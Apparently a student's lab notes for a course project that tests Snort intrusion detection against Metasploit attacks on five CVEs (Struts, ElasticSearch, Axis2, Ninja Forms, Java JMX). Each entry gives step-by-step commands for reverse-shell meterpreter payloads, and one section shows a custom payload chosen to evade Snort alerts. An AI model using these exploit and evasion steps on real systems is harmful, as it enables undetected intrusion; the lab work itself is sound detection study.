cybersecurity base project 2 notes

<REMOTEHOST> = 172.28.128.3
<LOCALHOST> = 172.28.128.4
<SNORTINTERFACE> = 2

 virtualbox-iso: The VM will be run headless, without a GUI. If you want to
 virtualbox-iso: view the screen of the VM, connect via VRDP without a password to
 virtualbox-iso: rdp://127.0.0.1:5985
 virtualbox-iso: Waiting 2m0s for boot...

=Install=
1. Clone
2. vagrant plugin install vagrant-omnibus
3. Vagrant up
=Configuration=
1. Install Snort 2.9.9.0 & snortrules-snapshot-2976
2. Install WinPCap 4.1.1
3. Snort conf changes
4. Test with C:\Snort\bin\snort.exe -c C:\Snort\etc\snort.conf -i <SNORTINTERFACE> -k none -T
5. Ping test works with snort.exe -c C:\Snort\etc\snort.conf -i <SNORTINTERFACE> -A console -k none

Test ping rule local.rules:  alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:"ICMP test"; sid:10000001; rev:001;)

LHOST 172.28.128.4
RHOST 172.28.128.3

Ruleset: snortrules-snapshot-2976

Discovered
1. CVE-2016-3087 - Apache Struts REST Plugin With Dynamic Method Invocation Remote Code Execution
	Prerequisites: Add 8282 to snort.conf HTTP_PORTS
	1. use exploit/multi/http/struts_dmi_rest_exec
	2. set RHOST <REMOTEHOST>
	3. set RPORT 8282
	4. set payload java/meterpreter/reverse_tcp
	5. set LHOST <LOCALHOST>
	6. run
	7. sysinfo
2. CVE-2014-3120 - ElasticSearch Dynamic Script Arbritrary Java Execution
	Preqrequisites: Uncomment line 812 in server-other.rules ("SERVER-OTHER ElasticSearch script remote code execution attempt")
	1. use exploit/multi/elasticsearch/script_mvel_rce
	2. set RHOST <REMOTEHOST>
	3. set payload java/meterpreter/reverse_tcp
	4. set LHOST <LOCALHOST>
	5. run
	6. sysinfo

3. CVE-2010-0219 - AXIS2 / SAP BusinessObjects Authenticated Code Execution (via SOAP)
	1. use exploit/multi/http/axis2_deployer
	2. set RHOST <REMOTEHOST>
	3. set RPORT 8282
	4. set payload java/meterpreter/reverse_tcp
	5. set LHOST <LOCALHOST>
	5. run
	6. sysinfo

Creating undiscovered exploit:
4. CVE-2016-2019 - Wordpress Ninja Forms Unauthenticated file upload
	1. use exploit/unix/webapp/wp_ninja_forms_unauthenticated_file_upload
	2. set RHOST <REMOTEHOST>
	3. set RPORT 8585
	4. set TARGETURI /wordpress/
	5. set FORM_PATH /index.php/king-of-hearts/
	_To alert snort_
	6. set payload php/meterpreter/bind_tcp
	7. set LHOST <LOCALHOST>
	8. run
	_To not alert snort_
	6. set payload generic/custom
	7. set payloadfile <PATHTOEXPLOIT> (e.g /root/cve_2016-2019_undetected.php)
	8. run
	Note: If you get the following error 
	Exploit failed: NoMethodError undefined method '[]' for nil:nilClass
	Make sure you have version with this fix implemented:
	https://github.com/rapid7/metasploit-framework/commit/f838c9990fa3a7858297ada47288cc67f04d87e4

5. CVE-2015-2342 - Java JMX Server Insecure Configuration Java Code Execution
	1. use exploit/multi/misc/java_jmx_server
	2. set RHOST <REMOTEHOST>
	3. set RPORT 1617
	4. set payload java/meterpreter/reverse_tcp
	5. set LHOST <LOCALHOST>
	6. run
	7. sysinfo
	8. exit
